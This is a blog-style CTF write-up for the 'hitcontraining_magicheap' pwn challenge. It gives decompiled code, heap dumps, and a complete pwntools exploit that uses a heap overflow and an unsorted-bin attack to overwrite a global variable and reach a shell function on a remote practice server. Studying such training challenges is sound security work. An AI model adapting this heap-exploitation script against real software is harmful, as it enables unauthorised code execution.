---
layout: post
title:  hitcontraining_magicheap
date:   2021-03-14 00:01:01 +0300
image:  2021-03-14-winter.jpg
tags:   [ctf,Pwn,ubuntu16,heap,unsorted bin]
---

#### checksec

```assembly
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### main()

```assembly
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf; // [rsp+0h] [rbp-10h]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, &buf, 8uLL);
      v3 = atoi(&buf);
      if ( v3 != 3 )
        break;
      delete_heap();
    }
    if ( v3 > 3 )
    {
      if ( v3 == 4 )
        exit(0);
      if ( v3 == 4869 )
      {
        if ( (unsigned __int64)magic <= 0x1305 )
        {
          puts("So sad !");
        }
        else
        {
          puts("Congrt !");
          l33t();
        }
      }
      else
      {
LABEL_17:
        puts("Invalid Choice");
      }
    }
    else if ( v3 == 1 )
    {
      create_heap();
    }
    else
    {
      if ( v3 != 2 )
        goto LABEL_17;
      edit_heap();
    }
  }
}
```

通过unsorted bin修改任意地址来修改magic的大小。

#### menu()

```assembly
int menu()
{
  puts("--------------------------------");
  puts("       Magic Heap Creator       ");
  puts("--------------------------------");
  puts(" 1. Create a Heap               ");
  puts(" 2. Edit a Heap                 ");
  puts(" 3. Delete a Heap               ");
  puts(" 4. Exit                        ");
  puts("--------------------------------");
  return printf("Your choice :");
}
```

#### create()

```assembly
unsigned __int64 create_heap()
{
  signed int i; // [rsp+4h] [rbp-1Ch]
  size_t size; // [rsp+8h] [rbp-18h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !heaparray[i] )
    {
      printf("Size of Heap : ");
      read(0, &buf, 8uLL);
      size = atoi(&buf);
      heaparray[i] = malloc(size);
      if ( !heaparray[i] )
      {
        puts("Allocate Error");
        exit(2);
      }
      printf("Content of heap:", &buf);
      read_input(heaparray[i], size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v4;
    }
  }
  return __readfsqword(0x28u) ^ v4;
}
```

没有记录初始化的size大小。

#### edit()

```assembly
int edit_heap()
{
  __int64 v1; // [rsp+0h] [rbp-10h]
  __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index :");
  read(0, (char *)&v1 + 4, 4uLL);
  LODWORD(v1) = atoi((const char *)&v1 + 4);
  if ( (signed int)v1 < 0 || (signed int)v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( !heaparray[(signed int)v1] )
    return puts("No such heap !");
  printf("Size of Heap : ", (char *)&v1 + 4, v1);
  read(0, (char *)&v1 + 4, 8uLL);
  v2 = atoi((const char *)&v1 + 4);
  printf("Content of heap : ", (char *)&v1 + 4, v1);
  read_input(heaparray[(signed int)v1], v2);
  return puts("Done !");
}
```

可以通过溢出修改其他堆的内容。

#### delete()

```assembly
int delete_heap()
{
  int v1; // [rsp+8h] [rbp-8h]
  char buf; // [rsp+Ch] [rbp-4h]

  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( !heaparray[v1] )
    return puts("No such heap !");
  free((void *)heaparray[v1]);
  heaparray[v1] = 0LL;
  return puts("Done !");
}
```

free堆块，指针置零，不存在UAF漏洞。

#### exp

```assembly
from pwn import *

elf = ELF("./magicheap")

# io = process("./magicheap")
io = remote("node3.buuoj.cn", 29929)

def create(size, content):
    io.recvuntil("Your choice :")
    io.sendline(str(1))
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap:")
    io.sendline(content)

def edit(index, size, content):
    io.recvuntil("Your choice :")
    io.sendline(str(2))
    io.recvuntil("Index :")
    io.sendline(str(index))
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap : ")
    io.sendline(content)

def delete(index):
    io.recvuntil("Your choice :")
    io.sendline(str(3))
    io.recvuntil("Index :")
    io.sendline(str(index))

create(0x30, "a"*8)
create(0x80, "b"*8)
create(0x10, "c"*8)
'''
0x10e6000:	0x0000000000000000	0x0000000000000041 0
0x10e6010:	0x6161616161616161	0x000000000000000a
0x10e6020:	0x0000000000000000	0x0000000000000000
0x10e6030:	0x0000000000000000	0x0000000000000000
0x10e6040:	0x0000000000000000	0x0000000000000091 1
0x10e6050:	0x6262626262626262	0x000000000000000a
0x10e6060:	0x0000000000000000	0x0000000000000000
0x10e6070:	0x0000000000000000	0x0000000000000000
0x10e6080:	0x0000000000000000	0x0000000000000000
0x10e6090:	0x0000000000000000	0x0000000000000000
0x10e60a0:	0x0000000000000000	0x0000000000000000
0x10e60b0:	0x0000000000000000	0x0000000000000000
0x10e60c0:	0x0000000000000000	0x0000000000000000
0x10e60d0:	0x0000000000000000	0x0000000000000021 2
0x10e60e0:	0x6363636363636363	0x000000000000000a
'''

delete(1)
'''
0x712000:	0x0000000000000000	0x0000000000000041
0x712010:	0x6161616161616161	0x000000000000000a
0x712020:	0x0000000000000000	0x0000000000000000
0x712030:	0x0000000000000000	0x0000000000000000
0x712040:	0x0000000000000000	0x0000000000000091 1
0x712050:	0x00007f08c260cb78	0x00007f08c260cb78
0x712060:	0x0000000000000000	0x0000000000000000
0x712070:	0x0000000000000000	0x0000000000000000
0x712080:	0x0000000000000000	0x0000000000000000
0x712090:	0x0000000000000000	0x0000000000000000
0x7120a0:	0x0000000000000000	0x0000000000000000
0x7120b0:	0x0000000000000000	0x0000000000000000
0x7120c0:	0x0000000000000000	0x0000000000000000
0x7120d0:	0x0000000000000090	0x0000000000000020
0x7120e0:	0x6363636363636363	0x000000000000000a
'''

magic = 0x6020A0
edit(0, 0x50, "d"*0x30+p64(0)+p64(0x91)+p64(0)+p64(magic - 0x10))

create(0x80, p64(0xffff))

io.sendlineafter("Your choice :", str(4869))

# gdb.attach(io)
# raw_input()

io.interactive()
```

